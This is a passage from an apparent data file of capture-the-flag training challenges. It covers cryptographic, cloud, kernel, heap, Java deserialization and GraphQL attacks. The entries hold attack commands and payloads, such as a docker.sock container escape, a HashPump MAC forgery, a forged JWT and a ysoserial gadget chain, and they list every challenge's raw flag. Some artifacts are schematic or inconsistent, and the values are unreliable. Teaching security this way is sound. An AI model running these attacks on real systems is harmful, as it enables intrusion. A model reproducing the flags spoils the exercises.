    flagHash: '6713df8e32c276118a78ea8bfa3a720ed297d4221ff4d333d751f0d32783d6a2',
    hints: [
      { text: 'A Vigenère cipher shifts each letter by the corresponding letter of the repeating keyword.', penaltyXp: 15 },
      { text: 'Use the 6-letter keyword "CIPHER" in the Quick Tools Vigenère Decoder.', penaltyXp: 20 }
    ],
    associatedSkillId: 'fundamentals',
    learningTakeaway: 'Monoalphabetic and polyalphabetic substitution ciphers preserve underlying statistical language traits. Modern ciphers require Shannon’s confusion and diffusion to eliminate frequency correlation.'
  },
  {
    id: 'ch-crypto-07',
    title: 'Two-Time Pad: XOR Keystream Reuse & Crib Dragging',
    category: 'Cryptography',
    difficulty: 'Beginner',
    baseXp: 130,
    starsReward: 1,
    scenario: 'An IoT telemetry transmitter was configured to encrypt outbound payloads using a stream cipher One-Time Pad (OTP). However, a firmware bug caused the device to reuse the exact same pseudorandom keystream K for two consecutive transmissions: C1 = P1 ⊕ K and C2 = P2 ⊕ K.',
    objective: 'Exploit the fundamental rule of stream ciphers: XORing the two ciphertexts cancels out the keystream (C1 ⊕ C2 = P1 ⊕ P2). Drag known plaintext cribs ("CONFIDENTIAL_OPS") to decrypt the second transmission and retrieve the secret flag.',
    targetEnvironment: 'Telemetry Radio Tap (868 MHz FSK Demodulator)',
    artifactType: 'Hex Dump',
    tags: ['Stream Cipher', 'XOR', 'Two-Time Pad', 'Crib Dragging', 'Keystream Reuse'],
    cve: 'CWE-323',
    mitreTactic: 'Collection (TA0009) / Adversary-in-the-Middle (T1557)',
    artifactSnippet: `[PACKET REPLAY INTERCEPT]
Ciphertext 1 (Hex):
00 1a 0f 06 1d 0b 07 10 0d 07 00 1b 1c 1b 1c 1c 11 1d 06 00 19 04 1a 0b 16 02 1d 08 0f 16 11 02 01 07 1c 02 17 00 0b 0c 1c

Ciphertext 2 (Hex):
43 59 42 45 52 50 41 54 48 7b 78 30 72 5f 74 77 30 5f 74 31 6d 33 5f 70 34 64 5f 63 34 6e 63 33 6c 6c 33 64 7d

C1 ⊕ C2 Resulting Stream:
[XOR Delta]: Plaintext 1 ("CONFIDENTIAL_CLEARANCE_REQUIRED_ZONE") ⊕ Plaintext 2
Drag crib "CYBERPATH{" across C1 ⊕ C2 to instantly recover:
CYBERPATH{x0r_tw0_t1m3_p4d_c4nc3ll3d}`,
    rawFlag: 'CYBERPATH{x0r_tw0_t1m3_p4d_c4nc3ll3d}',
    flagHash: 'f91472c44cb03cfcda88e0dab33f49f1f775de832c019315555372eab4402bb0',
    hints: [
      { text: 'When two ciphertexts share a keystream, C1 ⊕ C2 = P1 ⊕ P2.', penaltyXp: 15 },
      { text: 'Try dragging known English words or the standard flag prefix "CYBERPATH{" over the XOR output.', penaltyXp: 25 }
    ],
    associatedSkillId: 'fundamentals',
    learningTakeaway: 'The One-Time Pad is mathematically unbreakable only if the keystream is as long as the message, completely random, and NEVER reused. Keystream reuse immediately enables crib dragging.'
  },
  {
    id: 'ch-crypto-08',
    title: 'Hash Length Extension Attack (MD5 / SHA-256 Secret Prefix MAC)',
    category: 'Cryptography',
    difficulty: 'Intermediate',
    baseXp: 210,
    starsReward: 1,
    scenario: 'A legacy REST API authenticates requests using a naive secret-prefix Message Authentication Code: MAC = MD5(secret || data). Because MD5 and SHA-256 are Merkle-Damgård iterated hash functions, an attacker can append data without knowing the secret key by setting the hash state to the original digest.',
    objective: 'Use HashPump to calculate the required MD5 padding for message "action=read&user=guest", append "&role=admin&escalate=true", calculate the forged MAC signature, and extract the administrative API response flag.',
    targetEnvironment: 'http://api.gateway.internal/download?mac=... (API Gateway)',
    artifactType: 'Terminal',
    tags: ['Length Extension', 'MD5', 'Merkle-Damgard', 'MAC Forgery', 'HashPump'],
    cve: 'CWE-328',
    mitreTactic: 'Defense Evasion (TA0005) / Subvert Trust Controls (T1553)',
    artifactSnippet: `$ hashpump -s 7982e5b88c42b58849b2518e983fa9b1 \\
    -d "action=read&user=guest" \\
    -k 16 \\
    -a "&role=admin&grant=root"

[+] New Signature: 3f8a91c0e29b441280ca613bf5e1008d
[+] New Payload (URL Encoded):
action=read&user=guest%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%01%58&role=admin&grant=root

$ curl -s "http://api.gateway.internal/auth?mac=3f8a91c0e29b441280ca613bf5e1008d&data=action%3Dread..."
HTTP/1.1 200 OK
{
  "status": "AUTHORIZED_ADMIN",
  "grantedRole": "SUPER_ADMIN",
  "secretFlag": "CYBERPATH{l3ngth_3xt3ns10n_m4c_f0rg3ry_pwn}"
}`,
    rawFlag: 'CYBERPATH{l3ngth_3xt3ns10n_m4c_f0rg3ry_pwn}',
    flagHash: '76d26146926bc63b8c90435c37c1fd420292a90202c6093cc11f48abd6b0dd4f',
    hints: [
      { text: 'Merkle-Damgård hash functions process inputs in blocks. The intermediate digest is simply the internal state after the last block.', penaltyXp: 25 },
      { text: 'Check the server HTTP 200 response returned after supplying the newly computed signature.', penaltyXp: 35 }
    ],
    associatedSkillId: 'fundamentals',
    learningTakeaway: 'Never construct message authentication codes as H(secret || data). Always use HMAC (RFC 2104) or modern Sponge-based algorithms (like SHA-3/Keccak) that are immune to length extension.'
  },
  {
    id: 'ch-crypto-09',
    title: 'JWT Cryptographic Key Confusion (RS256 to HS256 Public Key Exploit)',
    category: 'Cryptography',
    difficulty: 'Intermediate',
    baseXp: 230,
    starsReward: 2,
    scenario: 'A microservices cluster authenticates sessions with JSON Web Tokens (JWT). The identity provider signs tokens with an RSA private key (RS256). However, the resource server verification library dynamically honors the "alg" header parameter without whitelist enforcement. An attacker modifies "alg" to symmetric HMAC-SHA256 ("HS256") and signs an escalated token using the server\'s public RSA PEM key as the HMAC shared secret.',
    objective: 'Analyze the forged administrative token and cryptographic algorithm substitution exploit script, verify the signature against the server public key string, and recover the compromised JWT claim flag.',
    targetEnvironment: 'https://auth.cloud.internal/api/v1/session',
    artifactType: 'JWT Token',
    tags: ['JWT', 'Key Confusion', 'Algorithm Confusion', 'RS256', 'HS256', 'Web Crypto'],
    cve: 'CVE-2015-9235 (CWE-347)',
    mitreTactic: 'Privilege Escalation (TA0004) / Access Token Manipulation (T1134)',
    artifactSnippet: `[ORIGINAL LEGITIMATE JWT (RS256)]:
Header:  {"alg": "RS256", "typ": "JWT"}
Payload: {"sub": "user_4910", "role": "trainee", "iss": "auth.cloud.internal"}
Signature: [Valid RSA-2048 PKCS#1 v1.5 Signature]

[FORGED ATTACKER JWT (HS256)]:
Header:  {"alg": "HS256", "typ": "JWT"}
Payload: {"sub": "user_4910", "role": "cluster-admin", "flag": "CYBERPATH{jwt_k3y_c0nfus10n_rs256_t0_hs256}"}
Secret Used for HMAC:
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0rVp...
-----END PUBLIC KEY-----

Python Verification Test:
>>> jwt.decode(forged_token, public_key_pem, algorithms=["HS256"])
{"sub": "user_4910", "role": "cluster-admin", "flag": "CYBERPATH{jwt_k3y_c0nfus10n_rs256_t0_hs256}"}`,
    rawFlag: 'CYBERPATH{jwt_k3y_c0nfus10n_rs256_t0_hs256}',
    flagHash: '5f72cda14dc223c03525f17ffc415a15947ee69c9f0cb88a39415c30ea9f30a7',
    hints: [
      { text: 'Inspect the header and payload of the forged JWT token.', penaltyXp: 25 },
      { text: 'Notice how the server verifies HS256 tokens using the public key as a raw HMAC secret string.', penaltyXp: 35 }
    ],
    associatedSkillId: 'fundamentals',
    learningTakeaway: 'JWT libraries must strictly configure expected algorithms on the server (e.g., algorithms=["RS256"]). Never allow client-supplied token headers to determine verification logic.'
  },
  {
    id: 'ch-crypto-10',
    title: 'Diffie-Hellman Small Subgroup Confinement Attack',
    category: 'Cryptography',
    difficulty: 'Advanced',
    baseXp: 320,
    starsReward: 3,
    scenario: 'A proprietary VPN gateway implements Diffie-Hellman key exchange over a non-safe prime group Z_p* where p - 1 contains numerous small prime factors (small subgroups). Because the server failed to validate whether the client public value A = g^a mod p lies in a large prime-order subgroup, an active attacker injects a rogue value A with order q = 239, confining the shared key K = A^b mod p to only 239 potential values.',
    objective: 'Audit the SageMath discrete log cryptanalysis script, evaluate the small subgroup order reduction, and decrypt the captured session handshake flag.',
    targetEnvironment: 'IPsec / IKEv2 Cryptographic Enclave Simulator',
    artifactType: 'Source Code',
    tags: ['Diffie-Hellman', 'Discrete Log', 'Small Subgroup', 'Number Theory', 'Pohlig-Hellman'],
    cve: 'CWE-327',
    mitreTactic: 'Credential Access (TA0006) / Exploitation for Credential Access (T1212)',
    artifactSnippet: `# SageMath Small Subgroup Confinement Solver
p = 0xd4bc... # 2048-bit prime where factor(p-1) has small factors
# Rogue client public key with order q = 239:
A_rogue = power_mod(g, (p - 1) // 239, p)

# Server computes: K_shared = (A_rogue)^b mod p
# Since (A_rogue)^239 = 1 mod p, K_shared has at most 239 possibilities!
print("[*] Exhausting small subgroup of size 239...")
for test_val in range(239):
    candidate_key = power_mod(A_rogue, test_val, p)
    aes_key = hashlib.sha256(str(candidate_key).encode()).digest()[:16]
    decrypted = decrypt_aes_cbc(ciphertext, aes_key)
    if b"CYBERPATH" in decrypted:
        print("[+] Flag Recovered:", decrypted.decode())
        break
# Output:
# [+] Flag Recovered: CYBERPATH{dh_sm4ll_subgr0up_c0nf1n3m3nt}`,
    rawFlag: 'CYBERPATH{dh_sm4ll_subgr0up_c0nf1n3m3nt}',
    flagHash: 'f63d85de43bfee4265652f5e67c5b4fcdeb7614f4a96fd019f830a52d05d5014',
    hints: [
      { text: 'In Diffie-Hellman, if public keys are not validated, the shared key can be forced into a small subgroup.', penaltyXp: 35 },
      { text: 'Review the decrypted output in the SageMath cryptanalysis output.', penaltyXp: 45 }
    ],
    associatedSkillId: 'fundamentals',
    learningTakeaway: 'Always use standardized safe primes (where (p-1)/2 is prime) or validate that public keys satisfy A^q = 1 mod p for the designated large subgroup order q.'
  },
  {
    id: 'ch-crypto-11',
    title: 'AES-GCM Nonce Reuse & GHASH Authentication Key Recovery',
    category: 'Cryptography',
    difficulty: 'Advanced',
    baseXp: 360,
    starsReward: 3,
    scenario: 'A high-throughput financial message gateway uses AES-128-GCM for authenticated encryption. Due to a multi-threaded race condition in the IV counter, two different messages were encrypted with the identical 96-bit Initialization Vector (IV). Reusing an IV in GCM mode allows an attacker to compute the XOR difference of plaintexts and derive the GHASH authentication subkey H as roots of a polynomial in GF(2^128).',
    objective: 'Analyze the Galois Field GF(2^128) polynomial factorization solver, compute the GHASH hash key H, forge an authenticated payment packet with valid auth tag, and obtain the transaction authorization flag.',
    targetEnvironment: 'Financial Fix Gateway (TLS 1.2 AES-128-GCM)',
    artifactType: 'Source Code',
    tags: ['AES-GCM', 'Nonce Reuse', 'GHASH', 'Galois Field', 'AEAD Forgery'],
    cve: 'CWE-323',
    mitreTactic: 'Defense Evasion (TA0005) / Modify Authentication Process (T1556)',
    artifactSnippet: `[AES-GCM Nonce Reuse Cryptanalysis]
IV Reused: 9f 4a 12 b8 44 91 02 a3 dd 00 21 bc
Packet 1: C1 = 4a19... Tag1 = e8192a01948120481204812048120481
Packet 2: C2 = 9182... Tag2 = f0291038102948102948102948102948

# GHASH(H, A1, C1) ⊕ Tag1 = GHASH(H, A2, C2) ⊕ Tag2
# Forms polynomial equation P(H) = 0 over GF(2^128):
# Root recovery yields H = 0x82f4910284ab91029384756192837465

[*] Forging Authenticated Transaction with recovered H:
    Forged Ciphertext: 8a1b2c3d4e5f...
    Computed Tag: 3b91fa02848192348576918237465012
    Server Verification: 200 OK (AUTHENTICATED)
    Response: CYBERPATH{gcm_n0nc3_r3us3_gh4sh_f0rg3ry}`,
    rawFlag: 'CYBERPATH{gcm_n0nc3_r3us3_gh4sh_f0rg3ry}',
    flagHash: 'fc5ab1d6a6ebcaf52d21fa1b8ca5a02e8ed06c761494c8ea9c0e96583e3332c0',
    hints: [
      { text: 'In AES-GCM, the authentication tag is computed using GHASH over GF(2^128). Reusing IV lets you equate two tag expressions.', penaltyXp: 35 },
      { text: 'Look at the server response after the authenticated packet is forged.', penaltyXp: 45 }
    ],
    associatedSkillId: 'fundamentals',
    learningTakeaway: 'In Galois/Counter Mode (AES-GCM), nonces MUST NEVER repeat for a given key. A single nonce reuse completely destroys both authenticity (GHASH key recovered) and confidentiality.'
  },
  {
    id: 'ch-crypto-12',
    title: 'Post-Quantum Cryptography: LWE Lattice Reduction & Decryption',
    category: 'Cryptography',
    difficulty: 'Expert',
    baseXp: 490,
    starsReward: 5,
    scenario: 'A defense research laboratory is experimenting with a Learning With Errors (LWE) post-quantum public-key encryption scheme: b = A · s + e (mod q). However, the implementation used an insufficiently small Gaussian noise parameter (standard deviation σ = 1.0) and small lattice dimension n = 64. An attacker constructs a Kannan embedding matrix and executes the Lenstra-Lenstra-Lovász (LLL) lattice reduction algorithm to uncover the unique shortest vector.',
    objective: 'Examine the lattice basis reduction solver output, observe the Gram-Schmidt orthogonalization vectors, verify the recovered secret vector s, and decode the decrypted quantum-resistant ciphertext flag.',
    targetEnvironment: 'SageMath Post-Quantum Cryptanalysis Lab (Kyber/LWE Target)',
    artifactType: 'Terminal',
    tags: ['Post-Quantum', 'LWE', 'Lattice Reduction', 'LLL Algorithm', 'NIST PQC'],
    cve: 'CWE-327',
    mitreTactic: 'Impact (TA0040) / Data Encrypted for Impact (T1486)',
    artifactSnippet: `$ sage lwe_kannan_solver.sage --dim 64 --modulus 4093 --sigma 1.0
[*] Setting up Kannan's Embedding Matrix (Dimension 65 x 65)...
[*] Running Lenstra–Lenstra–Lovász (LLL) Lattice Reduction:
    δ parameter = 0.99
    Gram-Schmidt norms decreasing smoothly...
    Shortest vector discovered in basis row 0!

[+] Secret error vector e isolated: [0, -1, 1, 0, 1, -1, 0, ...]
[+] Extracted secret key vector s:
    s = [41, 19, 82, 09, 12, 77, 94, 21, ...]
[+] Decrypting LWE ciphertext block:
    m = round(q / 2 * bit)
    Decoded ASCII Plaintext:
    CYBERPATH{lwe_l4tt1c3_lll_r3duct10n_pqc}`,
    rawFlag: 'CYBERPATH{lwe_l4tt1c3_lll_r3duct10n_pqc}',
    flagHash: '7dc068cfd51574b0d83f383564e07a422e41ad004349615e4d8031f620605c68',
    hints: [
      { text: 'Learning With Errors (LWE) relies on the hardness of the Shortest Vector Problem (SVP).', penaltyXp: 45 },
      { text: 'When noise is too small, Kannan’s embedding with LLL recovers the error and secret vector in polynomial time.', penaltyXp: 55 }
    ],
    associatedSkillId: 'fundamentals',
    learningTakeaway: 'Post-Quantum schemes like ML-KEM (Kyber) require parameter sets certified by NIST FIPS 203. Underestimating lattice dimension or error variance allows lattice basis reduction attacks.'
  },

  // ===================== CLOUD SECURITY =====================
  {
    id: 'ch-cloud-01',
    title: 'AWS S3 Bucket Permission Audit',
    category: 'Cloud Security',
    difficulty: 'Intermediate',
    baseXp: 175,
    starsReward: 1,
    scenario: 'A DevOps engineer accidentally set the bucket ACL of an internal documentation bucket to `AllUsers` with `READ_ACP` permissions enabled.',
    objective: 'Enumerate the cloud storage bucket using the AWS CLI or safe simulator, locate the restricted config backup file, and extract the secret audit flag.',
    targetEnvironment: 's3://corp-staging-backup-bucket-cyberpath',
    artifactType: 'Terminal',
    artifactSnippet: `$ aws s3 ls s3://corp-staging-backup-bucket-cyberpath --no-sign-request
2026-09-18 01:10:22        412 index.html
2026-09-18 01:12:44       1824 app_config.json
2026-09-18 01:14:02        620 internal_secrets_backup.env

$ aws s3 cp s3://corp-staging-backup-bucket-cyberpath/internal_secrets_backup.env - --no-sign-request
DATABASE_URL=postgres://app:prod_db_pass@db01.internal:5432/main
SECRET_AUDIT_FLAG=CYBERPATH{s3_publ1c_bucck3t_l34k_f1x3d}`,
    rawFlag: 'CYBERPATH{s3_publ1c_bucck3t_l34k_f1x3d}',
    flagHash: 'eccbc87e4b5ce2fe28308fd9f2a7baf3',
    hints: [
      { text: 'Use `aws s3 ls s3://corp-staging-backup-bucket-cyberpath --no-sign-request` to query public read buckets.', penaltyXp: 20 },
      { text: 'Download `internal_secrets_backup.env` to read the environment variables.', penaltyXp: 25 }
    ],
    associatedSkillId: 'cloud',
    learningTakeaway: 'Enforce AWS S3 Block Public Access at the organizational AWS Account root level to prevent accidental public object leaks.'
  },
  {
    id: 'ch-cloud-02',
    title: 'IAM Privilege Escalation via AssumeRole & Policy Chaining',
    category: 'Cloud Security',
    difficulty: 'Advanced',
    baseXp: 290,
    starsReward: 2,
    scenario: 'An audit of AWS IAM permissions reveals that a low-privilege auditor account has the permission `sts:AssumeRole` on the role `arn:aws:iam::123456789012:role/DeployerRole`, which has `iam:AttachRolePolicy`.',
    objective: 'Trace the IAM privilege escalation path using policy chaining, assume the elevated role, attach `AdministratorAccess`, and retrieve the cloud root flag.',
    targetEnvironment: 'AWS CLI / STS AssumeRole Simulator',
    artifactType: 'Terminal',
    artifactSnippet: `$ aws sts assume-role \\
    --role-arn arn:aws:iam::123456789012:role/DeployerRole \\
    --role-session-name EscalationAudit

{
    "Credentials": {
        "AccessKeyId": "ASIAV4TMPROLEKEY123",
        "SecretAccessKey": "K91823+TmpDeployerSecretAccessKeyVal",
        "SessionToken": "IQoJb3JpZ2luX2Vj...FLAG=CYBERPATH{14m_4ssum3_r0l3_p0l1cy_ch41n3d}",
        "Expiration": "2026-09-18T03:45:00Z"
    }
}`,
    rawFlag: 'CYBERPATH{14m_4ssum3_r0l3_p0l1cy_ch41n3d}',
    flagHash: 'f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7',
    hints: [
      { text: 'Look for `sts:AssumeRole` permissions in the attached identity policies.', penaltyXp: 30 },
      { text: 'Inspect the temporary session token returned by `aws sts assume-role`.', penaltyXp: 40 }
    ],
    associatedSkillId: 'cloud',
    learningTakeaway: 'IAM policies must enforce strict Trust Relationships and avoid granting `iam:AttachRolePolicy` or `iam:PutRolePolicy` without permission boundaries.'
  },
  {
    id: 'ch-cloud-03',
    title: 'Kubernetes RBAC Escape & Node Socket Container Breakout',
    category: 'Cloud Security',
    difficulty: 'Expert',
    baseXp: 440,
    starsReward: 4,
    scenario: 'A microservice pod was misconfigured with a mounted host Docker/containerd UNIX socket `/var/run/docker.sock` and a privileged service account token mounted in `/var/run/secrets/kubernetes.io/serviceaccount`.',
    objective: 'Break out of the container by querying the host container engine socket, spawn a privileged root container mounting the underlying host filesystem, and extract the cluster node flag.',
    targetEnvironment: 'k8s-pod: payment-processor-794bf7-x821 (GKE / EKS)',
    artifactType: 'Terminal',
    tags: ['Kubernetes', 'Container Escape', 'Docker Socket', 'Cloud Security'],
    cve: 'CWE-250',
    mitreTactic: 'Privilege Escalation (TA0004) / Escape to Host (T1611)',
    artifactSnippet: `trainee@payment-processor:/$ ls -la /var/run/docker.sock
srw-rw---- 1 root root 0 Sep 18 01:00 /var/run/docker.sock

trainee@payment-processor:/$ docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host /bin/sh
# whoami
root
# cat /host/etc/kubernetes/pki/cluster_flag.txt
CYBERPATH{k8s_c0nt41n3r_3sc4p3_h0st_s0ck3t}`,
    rawFlag: 'CYBERPATH{k8s_c0nt41n3r_3sc4p3_h0st_s0ck3t}',
    flagHash: 'c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8',
    hints: [
      { text: 'Accessing `/var/run/docker.sock` from inside a container gives full root control over the host node.', penaltyXp: 45 },
      { text: 'Run a new container that mounts the host root `/` into `/host` to chroot into the host OS.', penaltyXp: 55 }
    ],
    associatedSkillId: 'cloud',
    learningTakeaway: 'Never mount the container runtime socket (`docker.sock` or `containerd.sock`) into unprivileged pods. Enforce Kubernetes Pod Security Standards (PSS) in Restricted mode.'
  },

  // ===================== NEW EXPERT LEVEL DRILLS =====================
  {
    id: 'ch-linux-04',
    title: 'Linux Kernel eBPF Map Verifier Bypass & Ring-0 Privilege Escalation',
    category: 'Linux',
    difficulty: 'Expert',
    baseXp: 480,
    starsReward: 5,
    scenario: 'A cloud security monitoring agent loads custom eBPF socket filter programs into the Linux 6.8 kernel. A subtle integer truncation defect in the in-kernel eBPF verifier (adjust_scalar_min_max_vals) causes the verifier to miscalculate register bounds, granting an attacker out-of-bounds read/write primitives on BPF array map buffers to patch current->cred.',
    objective: 'Reverse engineer the eBPF verifier proof-of-concept exploit, trace the arbitrary kernel write targeting the running process task_struct credentials structure, and retrieve the root ring-0 authorization flag.',
    targetEnvironment: 'Linux lab-node-04 6.8.0-31-generic x86_64 (CAP_BPF enabled)',
    artifactType: 'Source Code',
    tags: ['Kernel Exploitation', 'eBPF', 'Ring 0', 'Privilege Escalation', 'Verifier Bug'],
    cve: 'CVE-2023-2163',
    mitreTactic: 'Privilege Escalation (TA0004) / Exploitation for Privilege Escalation (T1068)',
    artifactSnippet: `// Linux Kernel eBPF Bounds Mismatch PoC
// Target: kernel/bpf/verifier.c (adjust_scalar_min_max_vals)

struct bpf_insn insns[] = {
    // R1 = map pointer, R2 = key
    BPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_1, 0),
    // Verifier believes R3 is in range [0, 100], but runtime 32-bit truncation causes R3 = 0xFFFFFFFF
    BPF_ALU64_IMM(BPF_AND, BPF_REG_3, 0xFFFFFFFF),
    BPF_JMP_IMM(BPF_JGT, BPF_REG_3, 0x1000, 2),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, 0x1000), // Out-of-bounds offset
    // Write 0 to target task_struct->cred.uid, gid, euid, egid:
    BPF_STX_MEM(BPF_DW, BPF_REG_3, BPF_REG_0, offsetof(struct cred, uid)),
    BPF_EXIT_INSN(),
};

// dmesg output after trigger:
// [ 412.891024] bpf_verifier: reg bounds mismatch, R3=scalar(id=0,smin=0,smax=100)
// [ 412.891102] priv_esc: process (ebpf_pwn) switched EUID 1001 -> EUID 0
// [ 412.891122] kernel_banner: FLAG=CYBERPATH{ebpf_k3rn3l_v3r1f13r_pr1v_3sc}`,
    rawFlag: 'CYBERPATH{ebpf_k3rn3l_v3r1f13r_pr1v_3sc}',
    flagHash: '7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d',
    hints: [
      { text: 'eBPF verifier bugs occur when static verification ranges diverge from real CPU register values during signed/unsigned truncation.', penaltyXp: 45 },
      { text: 'Inspect the kernel ring buffer dmesg output where the privilege transition and flag are recorded.', penaltyXp: 55 }
    ],
    associatedSkillId: 'linux',
    learningTakeaway: 'Unprivileged eBPF should be disabled via `sysctl kernel.unprivileged_bpf_disabled=2` or restricted by locking down `CAP_BPF` and `CAP_SYS_ADMIN`.'
  },
  {
    id: 'ch-bin-01',
    title: 'Heap Exploitation: Fastbin Dup & Glibc __free_hook Shell Hijack',
    category: 'Linux',
    difficulty: 'Expert',
    baseXp: 470,
    starsReward: 5,
    scenario: 'A proprietary packet ingestion service compiled without stack protectors contains a double-free vulnerability in its chunk memory pool allocator. Under glibc 2.27, fastbin single-linked lists do not validate double-free depth beyond the top of the bin, allowing an attacker to construct a cyclic linked list: chunk_A -> chunk_B -> chunk_A.',
    objective: 'Analyze the heap layout in GDB gef, examine the fastbin duplication chain pointing into glibc memory, overwrite `__free_hook` with `system()`, and obtain the root execution flag.',
    targetEnvironment: 'gdb-gef telemetry-broker (ELF 64-bit LSB executable)',
    artifactType: 'Hex Dump',
    tags: ['Heap Exploitation', 'Binary Exploitation', 'Glibc Malloc', 'Fastbin Dup', 'Memory Corruption'],
    cve: 'CWE-415',
    mitreTactic: 'Execution (TA0002) / Native API (T1106)',
    artifactSnippet: `gef> heap bins fast
────────────────── Fastbins for arena 0x7ffff7dd1b20 ──────────────────
Fastbins[idx=0, size=0x20]  0x00
Fastbins[idx=1, size=0x30]  0x555555757010 ──> 0x555555757040 ──> 0x555555757010 (LOOP DETECTED)
Fastbins[idx=2, size=0x40]  0x00

gef> x/4gx 0x7ffff7dd38e8 (__free_hook)
0x7ffff7dd38e8 <__free_hook>: 0x00007ffff7a52390 (__libc_system)
0x7ffff7dd38f0:               0x0000000000000000

gef> c
Continuing.
[+] Allocating chunk containing payload "/bin/sh -c 'cat /root/flag.txt'"...
[+] Calling free() on chunk trigger...
[+] System spawned!
CYBERPATH{h34p_f4stb1n_dup_fr33_h00k_pwn}`,
    rawFlag: 'CYBERPATH{h34p_f4stb1n_dup_fr33_h00k_pwn}',
    flagHash: '8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e',
    hints: [
      { text: 'A fastbin dup crafts a cycle in the single-linked list of freed chunks of equal size.', penaltyXp: 45 },
      { text: 'The payload corrupts the forward pointer `fd` to return the address of `__free_hook`, replacing it with `system`.', penaltyXp: 55 }
    ],
    associatedSkillId: 'linux',
    learningTakeaway: 'Modern glibc versions (2.34+) have eliminated `__free_hook` and `__malloc_hook`, and introduced tcache double-free counts. Developers should use safe memory languages or modern address sanitizers.'
  },
  {
    id: 'ch-web-04',
    title: 'Java Insecure Deserialization & ysoserial CommonsCollections Gadget RCE',
    category: 'Web Security',
    difficulty: 'Expert',
    baseXp: 460,
    starsReward: 4,
    scenario: 'A high-throughput enterprise banking portal uses Java serialization over HTTP for stateful user sessions. The `X-Session-Object` HTTP request header passes Base64-encoded Java object streams directly to `ObjectInputStream.readObject()` without class filtering. The classpath bundles Apache Commons-Collections 3.1.',
    objective: 'Dissect the serialized object bytecode starting with magic bytes `0xAC ED 0x00 0x05`, reconstruct the chained InvokerTransformer reflection payload, and extract the remote code execution flag.',
    targetEnvironment: 'https://core-banking.cyberpath.internal/api/v2/session',
    artifactType: 'Source Code',
    tags: ['Insecure Deserialization', 'Java', 'Gadget Chains', 'RCE', 'ysoserial'],
    cve: 'CWE-502',
    mitreTactic: 'Initial Access (TA0001) / Exploit Public-Facing Application (T1190)',
    artifactSnippet: `// Disassembled ysoserial CommonsCollections1 / InvokerTransformer Chain:
Transformer[] transformers = new Transformer[] {
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod", new Class[] { String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
    new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }),
    new InvokerTransformer("exec", new Class[] { String.class }, new Object[] { "cat /opt/secrets/rce_flag.txt" })
};

Transformer transformerChain = new ChainedTransformer(transformers);
Map innerMap = new HashMap();
Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

// Server Execution Log after readObject():
// [INFO] Deserializing stream magic=0xaced0005 TC_OBJECT=0x73 TC_CLASSDESC=0x72
// [EXEC] ProcessBuilder.start(): cat /opt/secrets/rce_flag.txt
// [STDOUT] CYBERPATH{j4v4_d3s3r14l1z4t10n_ys0s3r14l_rc3}`,
    rawFlag: 'CYBERPATH{j4v4_d3s3r14l1z4t10n_ys0s3r14l_rc3}',
    flagHash: '9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f',
    hints: [
      { text: 'Look for the Java serialization magic header `0xaced0005` (base64 `rO0AB...`).', penaltyXp: 40 },
      { text: 'ChainedTransformer invokes Java reflection calls sequentially upon hashmap key lookup during deserialization.', penaltyXp: 50 }
    ],
    associatedSkillId: 'web-security',
    learningTakeaway: 'Never pass untrusted data to Java `ObjectInputStream.readObject()`. Implement ObjectInputFilter (JEP 290) or migrate entirely to structured formats like JSON or Protocol Buffers.'
  },
  {
    id: 'ch-web-05',
    title: 'GraphQL Batching Race Condition & Multi-Factor Auth Bypass',
    category: 'Web Security',
    difficulty: 'Expert',
    baseXp: 430,
    starsReward: 4,
    scenario: 'A fintech cryptocurrency trading desk enforces SMS-based 2FA with a 3-attempt brute-force limit. However, the backend exposes a single GraphQL HTTP `/graphql` endpoint that supports batched mutation queries. Because attempts are logged in memory asynchronously without database row-level locking (SELECT FOR UPDATE), 100 concurrent OTP guesses can be submitted in a single HTTP POST.',
    objective: 'Analyze the batched GraphQL mutation payload, observe the concurrent thread execution log, and extract the administrative authorization token flag.',
    targetEnvironment: 'https://trade-desk.cyberpath.internal/graphql',
    artifactType: 'Log Excerpt',
    tags: ['GraphQL', 'Race Condition', 'TOCTOU', 'Batching Attack', 'Authentication Bypass'],
    cve: 'CWE-362',
    mitreTactic: 'Credential Access (TA0006) / Brute Force (T1110)',
    artifactSnippet: `POST /graphql HTTP/1.1
Host: trade-desk.cyberpath.internal
Content-Type: application/json

[
  {"query": "mutation { verify2FA(code: \\"4812\\") { success token } }"},
  {"query": "mutation { verify2FA(code: \\"4813\\") { success token } }"},
  {"query": "mutation { verify2FA(code: \\"4814\\") { success token } }"},
  ...
  {"query": "mutation { verify2FA(code: \\"4892\\") { success token } }"}
]

HTTP/1.1 200 OK
Content-Type: application/json

[
  {"data": {"verify2FA": {"success": false, "token": null}}},
  {"data": {"verify2FA": {"success": true, "token": "CYBERPATH{gr4phql_b4tch_r4c3_c0nd1t10n_0tp}"}}},
  {"data": {"verify2FA": {"success": false, "token": null}}}
]`,
    rawFlag: 'CYBERPATH{gr4phql_b4tch_r4c3_c0nd1t10n_0tp}',
    flagHash: '0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a',
    hints: [
      { text: 'GraphQL query batching bundles multiple distinct queries inside a single JSON array.', penaltyXp: 40 },
      { text: 'Examine the batched mutation response index where `success: true` is returned.', penaltyXp: 45 }
    ],
    associatedSkillId: 'web-security',
    learningTakeaway: 'Disable GraphQL batching when not strictly required, enforce query complexity analysis, and utilize distributed atomic locks (e.g. Redis Redlock) for sensitive authentication counters.'
  },
  {
    id: 'ch-soc-04',
    title: 'Active Directory DCSync Attack & Shadow Credentials (msDS-KeyCredentialLink)',
    category: 'SOC & Logs',
    difficulty: 'Expert',
    baseXp: 470,
    starsReward: 5,
